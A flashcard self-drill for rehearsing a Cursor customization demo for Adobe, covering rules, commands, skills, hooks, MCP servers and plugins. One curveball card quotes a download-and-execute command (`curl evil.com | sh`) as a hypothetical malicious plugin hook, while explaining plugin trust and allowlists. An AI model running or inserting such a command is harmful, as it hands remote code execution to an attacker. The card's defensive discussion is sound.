# Cursor 201 self-drill — 35 cards, 4 tiers

A self-test you should be able to run cold the morning of the Adobe 201
session. Use it to find your weak edges fast.

## How to use this

1. Cover the answer column with a sticky / your hand.
2. Read the question. Set a mental clock — Tier 1 should be <10 seconds,
   Tier 2 <30 seconds, Tier 3 <60 seconds, Tier 4 you can take a minute.
3. Speak the answer out loud. Saying it out loud is closer to the actual
   demo conditions than thinking it.
4. Reveal the answer. If you missed it, mark the card and re-drill at the end.
5. Goal: hit ≥80% on Tier 1+2 cold, ≥60% on Tier 3, and have a confident
   "I'd say..." for every Tier 4 card. Below those bars, drill the misses
   one more pass before Friday.

## The framework all cards hang on

Four customization axes plus two scaling primitives. Almost every "how do I
do X in Cursor?" question reduces to picking from this matrix:

| Axis | Loaded | Triggered by | Lives in |
|---|---|---|---|
| Rules | Always (or by glob) | The agent loop, automatically | `.cursor/rules/*.mdc` |
| Commands | On demand | You typing `/name` | `.cursor/commands/*.md` |
| Skills | When relevant | Agent decision based on the SKILL description | `.cursor/skills/*/SKILL.md` |
| Hooks | On event | IDE / agent lifecycle events | `.cursor/hooks.json` + `.cursor/hooks/*` |

Scaling primitives:
- **MCP servers** — extend the agent's *tool* surface (Linear, Slack,
  Datadog, internal services). Declared in `.cursor/mcp.json`.
- **Plugins** — bundle rules + commands + skills + hooks + MCP into one
  distributable unit. Declared in `.cursor-plugin/plugin.json`.

Burn this matrix in. The rest of the cards stress-test it.

---

## Tier 1 — Vocabulary fluency (10)

Target: <10 seconds each. These are recall, not reasoning.

### T1-1

**Q.** Where does a *project-scoped* Rule live? Where does a *personal* Skill live?

**Hint.** Both follow the same pattern: project = inside the repo, personal = home dir.

**Answer.** Project rule: `.cursor/rules/<name>.mdc`. Personal skill: `~/.cursor/skills/<name>/SKILL.md`. (Project skill would be `.cursor/skills/<name>/SKILL.md`.)

**Why it matters.** Adobe will ask "personal vs team scope" within five minutes of the demo. Knowing the exact paths makes you sound like a power user, not a docs reader.

### T1-2

**Q.** Name three Cursor hook event names — one shell, one file, one MCP.

**Hint.** All follow `<before|after><Noun>` naming.

**Answer.** `beforeShellExecution`, `afterFileEdit`, `beforeMCPExecution`. (Bonus: `preToolUse`, `postToolUse`, `sessionStart`, `subagentStop`, `stop`.)

**Why it matters.** The 201 headline beat is "hooks intercepting MCP calls." If you stumble on the event name on stage, the beat collapses.

### T1-3

**Q.** What file declares a plugin, and where does it live relative to the plugin root?

**Hint.** Dot-prefixed dir, JSON manifest.

**Answer.** `.cursor-plugin/plugin.json` at the plugin root.

**Why it matters.** The plugin model is your "Adobe ships this to 5,000 engineers" beat. Wrong path = wrong beat.

### T1-4

**Q.** What are the Rule application modes you can pick in Cursor settings?

**Hint.** Three of them, ordered from most-loaded to least.

**Answer.** **Always**, **Agent Decides** (also called Agent-Requested or Auto-Attached when glob-scoped), and **Manual**.

**Why it matters.** This is the question Adobe will ask when they realize Rules can eat context. Knowing the modes shows you've actually thought about cost.

### T1-5

**Q.** Where do project-scoped slash commands live?

**Hint.** Mirrors `.cursor/rules/` and `.cursor/skills/`.

**Answer.** `.cursor/commands/<name>.md`. Personal-scoped: `~/.cursor/commands/<name>.md`.

**Why it matters.** During the live demo you'll create one in front of the audience. Open the right folder on the first try.

### T1-6

**Q.** What does `@file` actually do versus `@folder` in chat?

**Hint.** Both are context anchors; they differ in scope and recursion.

**Answer.** `@file` pins a specific file into the context window for this turn. `@folder` adds the folder's structure (file tree, not full contents — Cursor expands selectively based on the prompt).

**Why it matters.** Power-user signal in 5 seconds. The team you're talking to lives in `@`-mentions.

### T1-7

**Q.** What's the difference between **Ask**, **Plan**, and **Build** mode in one sentence each?

**Hint.** Read-only / write-restricted / full write.

**Answer.** **Ask** — read-only Q&A, no edits. **Plan** — read-only investigation that writes a plan file you sign off on. **Build** — full read/write/execute autonomy, runs the plan.

**Why it matters.** 101 covered this. 201 audience will test if you can be crisp about it under pressure.

### T1-8

**Q.** Where do you configure an MCP server for a project? For your user account?

**Hint.** Same pattern as commands/rules/skills.

**Answer.** Project: `.cursor/mcp.json`. User: `~/.cursor/mcp.json`. (Plugins can also declare MCP servers inline via the `mcpServers` field of `plugin.json`.)

**Why it matters.** "Can we run MCP in our VPC?" — yes, declare it project-scoped, point at your stdio binary or HTTP endpoint inside the firewall.

### T1-9

**Q.** Four primitives a plugin can bundle. Name them.

**Hint.** Five if you count `agents`. Six if you count `mcpServers`.

**Answer.** Rules, Commands, Skills, Hooks, MCP servers, Agents. (The `plugin.json` manifest has fields for each.)

**Why it matters.** Plugin = "the whole 201 framework in one zip." Knowing what can be in it = knowing what you can distribute.

### T1-10

**Q.** What does `cursor agent` (the CLI) do, in one sentence?

**Hint.** Headless mode.

**Answer.** Runs Cursor's agent loop from a terminal — outside the IDE — against a workspace. Used for CI/CD, batch jobs, and one-shot automations.

**Why it matters.** This is the "Adobe runs Cursor in CI" beat. If asked "can we run Cursor without an IDE?" — yes, `cursor agent`.

---

## Tier 2 — Mechanics (10)

Target: <30 seconds each. Short technical reasoning.

### T2-1

**Q.** Two `afterFileEdit` hooks are declared — one runs a secrets scan, one runs Prettier. What's the ordering and failure contract?

**Hint.** Hooks per event are an array.

**Answer.** They run in declared order, sequentially. If a hook exits non-zero, the agent sees the failure and can self-correct or stop — but the edit is *not* automatically rolled back. Hooks are guardrails, not transactions. Put cheapest / most-likely-to-block first (secrets > formatter).

**Why it matters.** Adobe will ask "what if a hook fails." Don't oversell the rollback story; the honest answer here builds trust.

### T2-2

**Q.** A Skill's description says "use when shipping a hotfix." The user types `/hotfix`. What actually triggers the load?

**Hint.** Two paths, same skill.

**Answer.** Two independent triggers — the *slash invocation* (`/hotfix`) forces the skill load; the *description match* would have loaded it anyway if the agent decided the conversation was about hotfixes. The slash path is deterministic; the description path is agent-routed and probabilistic.

**Why it matters.** This is THE Skill confusion point. Adobe engineers will misunderstand it; you correcting them politely is leadership.

### T2-3

**Q.** What gets sent to the model on *every turn* vs *only when summoned*?

**Hint.** Always vs on-demand columns in the four-axis table.

**Answer.**
- **Every turn:** Rules in "Always" mode, AGENTS.md, prior conversation turns (subject to compaction), tool definitions for *active* MCP servers, the current Plan if in Plan mode.
- **On summon:** `@file` / `@folder` / `@web` mentions, Skills the agent decides to load, Memories the agent decides are relevant, file contents read mid-turn.
- **Compacted:** Older turns and large tool outputs get summarized into shorter forms once the window gets tight.

**Why it matters.** Adobe is paying for tokens. "What's actually in my context" is the question that maps to cost.

### T2-4

**Q.** Plan mode says it's "read-only." What does that actually enforce mechanically?

**Hint.** Two kinds of write are blocked; one kind is allowed.

**Answer.** Plan mode blocks file edits to source code and disallows shell commands that mutate state. It *does* let the agent write to its plan file (typically `plan.md`) and run read-only tooling (grep, ls, cat). The contract: nothing in the working tree changes except the plan.

**Why it matters.** Adobe security will ask "how do I trust the agent in Plan mode to not run `rm -rf`?" — Plan mode enforces it at the harness level, not by trusting the model.

### T2-5

**Q.** A `beforeShellExecution` hook is declared in your plugin AND in your user-level `~/.cursor/hooks.json`. Both fire on every shell command. Which one wins? Or do both run?

**Hint.** Cursor doesn't pick a winner.

**Answer.** Both run, sequentially. Hooks are *additive across scopes*, not overriding. If either exits non-zero, the shell command is blocked. This is how you compose project-specific guardrails on top of personal ones.

**Why it matters.** Adobe org-level governance + per-repo customization is the layered-defenses story. This card is the mechanic that makes it true.

### T2-6

**Q.** Three ways the agent can reach an MCP tool. Name them.

**Hint.** Project, user, plugin — but also one more.

**Answer.** Project `.cursor/mcp.json`, user `~/.cursor/mcp.json`, declared in a plugin's `plugin.json`, and enabled via Cursor Settings (e.g., admin-pushed for enterprise). All four merge into the active tool set.

**Why it matters.** Adobe wants to know "where does this MCP server actually come from when I install the plugin." Three answers, four really.

### T2-7

**Q.** The agent fires a Skill. The Skill itself wants to call an MCP tool. Does a `beforeMCPExecution` hook still fire?

**Hint.** Hooks intercept the runtime, not the caller.

**Answer.** Yes. Hooks intercept at the agent loop level — every MCP tool call the agent makes goes through the hook, regardless of whether it was prompted by a Rule, a Skill, a Command, or the user. That's exactly why hooks are the right place for governance.

**Why it matters.** This is the foundation of the Adobe security beat. If hooks didn't intercept skill-initiated calls, the audit trail would have holes.

### T2-8

**Q.** Composer vs Opus vs GPT — when do you reach for each?

**Hint.** Throughput vs reasoning vs spec-writing.

**Answer.** **Composer** for in-IDE execution speed and tool-using throughput (Build mode, run loops, agentic tool calls). **Opus** for wide-surface planning and architectural reasoning (Plan mode on complex features). **GPT-5.5** (or whatever's current) for spec writing, precise prose, and long-form refactoring conversations. Same agent harness — model is a dial.

**Why it matters.** Model-neutrality is the highest-impact Cursor-vs-Claude-Code talking point. If you stutter on "when do I use which model" the differentiator dies.

### T2-9

**Q.** What's the difference between AGENTS.md, a Rule in `Always` mode, and a Memory?

**Hint.** Repo-level, project-level, account-level.

**Answer.** **AGENTS.md** = repo-level, lives in version control, the agent reads it on session start, equally visible to every collaborator. **Always-mode Rule** = project- or user-level, also always-loaded, but lives in `.cursor/rules/` and supports application modes. **Memory** = account-level, opt-in, persistent across sessions and projects, modeled as the agent's recollection of "things you told me."

**Why it matters.** Adobe will ask "how do I avoid memory leaks across customers / repos?" — Memories are account-scoped and opt-in; AGENTS.md and Rules are scoped to the workspace.

### T2-10

**Q.** A custom command (`.cursor/commands/review-pr.md`) and a Skill (`.cursor/skills/review-pr/SKILL.md`) both exist. The user types `/review-pr`. What happens?

**Hint.** Slash invocation has explicit precedence rules.

**Answer.** The Command wins on `/`-invocation — slash commands resolve to the Commands directory first. The Skill is still available but is loaded by *agent decision* (description match), not by `/`-invocation. Best practice: don't name them the same thing; pick one axis per workflow.

**Why it matters.** Naming collisions are an Adobe-scale problem when teams ship plugins. Knowing the precedence rule = knowing how to lint your team's plugin catalog.

---

## Tier 3 — Trade-offs & framework choices (10)

Target: <60 seconds each. The "which axis for this scenario?" matrix —
this is what Adobe will probe.

### T3-1

**Q.** "We want every PR to follow our internal security checklist before it can be opened." Rule, Command, Skill, or Hook?

**Hint.** What's the trigger? Who runs it?

**Answer.** **Skill** for the checklist content + workflow (loaded when the agent realizes "we're about to open a PR"), plus a **Hook** on `beforeShellExecution` matching `gh pr create` to enforce that the skill ran. Two axes layered. Rule alone is weaker because it can be ignored under load; Command alone requires the engineer to remember.

**Why it matters.** The right answer is "two axes." Adobe will respect the engineer who picks two over the one who picks one.

### T3-2

**Q.** "We want to block `npm install` of any package outside our allowlist." Rule, Command, Skill, or Hook?

**Hint.** Has to enforce, not advise.

**Answer.** **Hook** — `beforeShellExecution` with matcher `npm install`. A script that diffs the requested package against your allowlist and exits non-zero if the package isn't there. A Rule that *says* "don't install unapproved packages" can be ignored; a hook cannot.

**Why it matters.** "Rules are advice, hooks are enforcement." This is the one-liner Adobe needs to hear.

### T3-3

**Q.** "We want every new engineer to easily run our hotfix playbook from chat." Command or Skill?

**Hint.** Do they know the workflow by name yet?

**Answer.** **Command** (`/hotfix`) if the workflow is short, well-scoped, and the engineer knows when to fire it. **Skill** if the workflow is multi-step, conditional, or you'd rather the agent surface it when context suggests it. For "new engineer" specifically — Command, because they may not know the workflow exists but they *will* see it in the `/` menu.

**Why it matters.** Discoverability is a feature. Commands show up in `/`; skills hide until summoned.

### T3-4

**Q.** "We want the agent to *never* read our `.env.prod` file." Rule or Hook?

**Hint.** Read-time, not write-time.

**Answer.** **Hook** — `beforeReadFile` matching `.env.prod`. A Rule saying "don't read .env.prod" is best-effort; a hook is a hard stop at the I/O boundary. Use the rule for *signaling intent* and the hook for *enforcement* — both is fine, hook is the load-bearing one.

**Why it matters.** "Best-effort vs hard stop" again. Adobe security will only respect the hard-stop answer.

### T3-5

**Q.** "We want a new junior engineer to ship their first PR using the team's standard flow without reading docs." Skill or command-chain or both?

**Hint.** The team flow is multi-step.

**Answer.** **Both, layered.** A `/ship-feature` Command that internally references the `linear-feature-flow` and `pr-summary` Skills. The command is the discoverable entry point; the skills do the work. This is also the case for `.cursor/agents/` — a custom agent prompt could pin the same flow.

**Why it matters.** This is the composition pattern Adobe will want to standardize. "Commands are doors, skills are rooms."

### T3-6

**Q.** "We want every external MCP tool call audited and the audit log shipped to our SIEM." Rule, Command, Skill, or Hook?

**Hint.** Event-driven, must capture every call.

**Answer.** **Hook** — `beforeMCPExecution` (and optionally `afterMCPExecution` for outcome) that appends a structured log line per call. Pipe the log to a tailing daemon that forwards to your SIEM. A Rule can't enforce uniform logging; a Skill only runs when summoned. The hook is the only axis that intercepts deterministically.

**Why it matters.** This is the **headline 201 beat**, exactly as the demo runbook stages it. Internalize this answer.

### T3-7

**Q.** "We want the AI to know our internal API client library's preferred patterns." Rule, Skill, or AGENTS.md?

**Hint.** Static knowledge, always-relevant.

**Answer.** **Rule** in `Auto-Attached` mode with `globs: src/internal-api/**`, or a section in **AGENTS.md** if it's truly cross-cutting. Skill is the wrong fit because it's not procedural ("how to do X step-by-step") — it's declarative ("the lib works like Y"). Skill = playbook, Rule = standing constraint.

**Why it matters.** Misclassifying static knowledge as a Skill bloats your skill catalog and pollutes the agent's decision space.

### T3-8

**Q.** "We want the agent to run a smoke test on every PR before opening it, and *block* if the smoke fails." Skill or Hook?

**Hint.** Block = enforcement.

**Answer.** **Hook** for the block (`beforeShellExecution` matching `gh pr create` or similar) and a **Skill** that owns *how* to run the smoke. The hook calls the skill internally or just runs the smoke command directly. Smoke logic in the skill, gate in the hook.

**Why it matters.** "Logic and gate are separate concerns." This is a clean architecture point that Adobe SREs will recognize from their own infra.

### T3-9

**Q.** "We have an internal Adobe documentation MCP that lets us search confluence." Should it be installed per-user, per-repo, or via a plugin?

**Hint.** Who needs it? Who admins it?

**Answer.** **Plugin** — bundle the MCP declaration + a "search confluence" Skill + a `/confluence` Command + sensible Rules about citing sources. Install the plugin org-wide via Cursor admin allowlist. Per-repo is too narrow (every repo would re-declare it); per-user is too broad (someone has to make it easy).

**Why it matters.** Plugins are the org-distribution answer. If the audience hears "just put it in your dotfiles" you lose them — they want a manifest they can audit.

### T3-10

**Q.** "We want the agent to refuse to push if tests aren't passing." Rule, Hook, or both?

**Hint.** Trust no model.

**Answer.** **Both.** Rule says "always run `npm test` before `git push` and abort on red." Hook on `beforeShellExecution` with matcher `git push` runs `npm test` itself and exits non-zero on failure. The rule shapes the agent's *intent*; the hook is the *floor* that catches it when the agent forgets.

**Why it matters.** "Belt and suspenders" is the right vocabulary. Adobe security will recognize it.

---

## Tier 4 — Curveballs (5)

Pre-baked answers for plausible advanced objections. Don't memorize the
words — internalize the shape of the answer, then say it in your own voice.

### T4-1

**Q.** "Hooks run arbitrary shell scripts. What's the security model? What's stopping a malicious plugin from running `curl evil.com | sh` on every file edit?"

**Hint.** Plugin trust + admin allowlist + Cursor marketplace review.

**Answer.** Three layers. (1) **Plugin review** — the Cursor marketplace manually reviews every official plugin before listing. Community plugins are fetched from explicit git URLs you opt into. (2) **Admin allowlist** — Adobe's admin panel can restrict which plugins, MCP servers, and hooks can be installed across the org. You can pin to an internal registry. (3) **Hook scripts are visible in version control** — the script files live in `.cursor/hooks/*.sh` next to the manifest. Code review applies. Nothing is hidden. The security model is "your team's code review process plus admin allowlist." It's not zero-trust by default; it's bring-your-own-trust-model. For Adobe specifically: maintain an internal plugin registry, require security review on hook scripts, and use the admin allowlist to block anything off-registry.

**Why it matters.** This is the question that decides whether Adobe enables hooks at all. Get the three-layers right.

### T4-2

**Q.** "What's actually in Cursor's context window under load? Claude Code dumps everything; Cline aggressively prunes. What does Cursor do?"

**Hint.** Tiered: pinned vs summoned vs compacted.

**Answer.** Cursor's harness tiers context. **Pinned and always-included:** Rules in Always mode, AGENTS.md, the active Plan, the current file (when relevant), tool definitions. **Summoned:** Skills the agent loads on demand, `@`-mentions, file reads in-turn, MCP tool definitions for active servers. **Compacted on pressure:** older conversation turns and large tool outputs are summarized rather than dropped. Skills NOT currently relevant don't load — that's the whole point of description-routed loading. The practical effect is the agent has more useful context per-token than systems that either dump everything or aggressively prune. The dial is yours: more in Always mode = more guaranteed signal but less headroom. Most teams over-pin in their first month and then tune down.

**Why it matters.** This is the technical-credibility question. Adobe has engineers who've used three of these tools — they're comparing harness behavior.

### T4-3

**Q.** "How do you avoid Skills polluting the agent's context when none of them are relevant? Doesn't the model see all the SKILL.md descriptions every turn?"

**Hint.** Descriptions only, not bodies. And description quality is the lever.

**Answer.** Yes — the *descriptions* of every available Skill are presented to the model so it can decide which (if any) to load. But the *body* of the SKILL.md only loads when the agent decides it's relevant or when invoked via `/`. The description is one or two sentences, so the per-turn cost of N skills is roughly N short sentences. The pollution risk is real if your team ships hundreds of skills with vague descriptions ("a helpful workflow"). Mitigations: (1) write descriptions that explicitly name the trigger condition ("Use when the user is opening a PR and asks for a summary"); (2) prune unused skills; (3) at very large scale, use plugin scoping so different teams' skill catalogs don't merge into one giant set; (4) the admin allowlist can disable skills org-wide. So: the architecture handles it, but your skill-description discipline is the load-bearing piece.

**Why it matters.** This is the question that signals you've used Cursor at scale, not just toy-scale. Adobe will believe you when you talk about description discipline.

### T4-4

**Q.** "We have a 30M-line monorepo. How does indexing actually work? Re-scan from scratch every commit?"

**Hint.** Incremental, semantic, on-demand expansion.

**Answer.** Incremental. First-time indexing of a 30M-line monorepo takes time — that's table stakes for any code intelligence tool. After that it's incremental and fast: only changed files get re-embedded. The agent doesn't read the full tree — it pulls context through semantic search ("find code that handles billing tax calculation") plus targeted file reads. For a monorepo that size, you'd typically also lean on `.cursorignore` to exclude generated code, vendored deps, and anything the agent doesn't need to reason about — same way you'd configure a search engine. Concrete proof points: NVIDIA, Stripe, and Coinbase all run monorepos at that scale on Cursor. Stripe's CTO has spoken publicly about going from hundreds to thousands of engineers on Cursor against their monorepo.

**Why it matters.** This is the scale question. Adobe Creative Cloud has multiple monorepos in this range. Confidence here unlocks the rest of the conversation.

### T4-5

**Q.** "How does Best-of-N actually pick the winning attempt? Is it just diffing? Eval-based? Vibes?"

**Hint.** It's not magic; it's structured.

**Answer.** Best-of-N at the Cloud Agent level fans out N parallel attempts on the same task, each in an isolated git worktree on its own branch. Selection is *not* automatic by default — the engineer reviews the N attempts side-by-side and picks the winner (or merges across them). Where it gets interesting: you can write an *eval hook* — a script run on each candidate that scores it (tests pass? type-checks? lint clean? diff size? perf benchmark?) — and use those scores to surface the most likely winner first. So the answer is "structured human-in-the-loop by default, with optional automated eval gates." For Adobe's a11y bar, you could imagine the eval hook running axe-core against the candidate and only surfacing PRs that pass.

**Why it matters.** Best-of-N is a "future of dev" question. Saying "vibes" loses the room; saying "structured human-plus-eval-hook" wins it.

---

## Drill protocol — Friday morning

15 minutes, in this order:

1. **Tier 1 cold pass** — 10 cards, 2 minutes. Goal: 10/10. Anything missed, re-drill before moving on.
2. **Tier 2 cold pass** — 10 cards, 5 minutes. Goal: 8/10 or better.
3. **Tier 3 timed pass** — 10 cards, 5 minutes. Don't dwell; if a card stumps you, mark it and move on. Goal: 6/10 with confidence on the others.
4. **Tier 4 talk-through** — 5 cards, 3 minutes. Say each answer out loud as if to the customer. Listen for stumbles.
5. **Misses re-drill** — whatever you marked, one more pass.

If you nail Tiers 1+2 cold, you have the *vocabulary*. If you nail Tier 3,
you have the *framework*. Tier 4 is the *coaching*.

The framework is the real product. The Adobe audience won't remember every
file path you cited — they will remember that you walked in with a clear
model of "four axes plus MCP plus plugins" and applied it consistently.
That's the leadership beat the 201 prompt is grading on.
